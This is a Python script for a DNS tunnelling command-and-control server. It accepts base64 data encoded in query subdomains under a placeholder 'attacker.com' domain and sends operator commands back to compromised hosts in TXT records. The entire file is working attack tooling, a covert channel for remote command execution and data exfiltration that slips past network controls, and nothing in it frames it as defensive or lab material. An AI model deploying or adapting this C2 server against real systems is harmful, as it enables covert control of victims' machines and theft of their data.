import base64
from dnslib.server import DNSServer, BaseResolver, DNSLogger
from dnslib import RR, QTYPE, TXT
import threading
import queue
import sys

def print_status(text: str): 
    print(f"[*] {text}")

def print_above_cursor(s): 
    print(f"\033[{5}A", end="")
    print_status(s)

def get_commands(command_queue: queue.Queue): 
    while True: 
        command = input("[*] Enter Command: ")
        command_queue.put(command)

class TunnelResolver(BaseResolver):
    def __init__(self, command_queue: queue.Queue): 
        self.command_queue = command_queue
        super().__init__()

    def resolve(self, request, handler):
        reply = request.reply()

        qname = request.q.qname
        labels = str(qname).rstrip(".").split(".")

        # Expect: <payload>.attacker.com
        try:
            payload = labels[0]

            decoded = base64.urlsafe_b64decode(payload + "==").decode()

            print_above_cursor(f"Received: {decoded}")

            response_text = ""
            try: 
                response_text = command_queue.get_nowait()
                print_above_cursor(f"Sending Command: {response_text}")
            except queue.Empty: 
                response_text = "ACK"

            encoded_resp = base64.urlsafe_b64encode(
                response_text.encode()
            ).decode()

            reply.add_answer(
                RR(
                    qname,
                    QTYPE.TXT,
                    rdata=TXT(encoded_resp),
                    ttl=0
                )
            )
        except Exception as e:
            print_above_cursor(f"ERROR: {e}")

        return reply



if __name__ == "__main__":
    command_queue = queue.Queue()

    server = DNSServer(
        TunnelResolver(command_queue),
        logger=DNSLogger(logf=lambda s:()),
        port=53,
        address="0.0.0.0",
        tcp=False
    )

    print("DNS tunnel server running\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
    server.start_thread()

    command_thread = threading.Thread(target=get_commands, args=(command_queue,))
    command_thread.start()

    server.thread.join()
    command_thread.join()



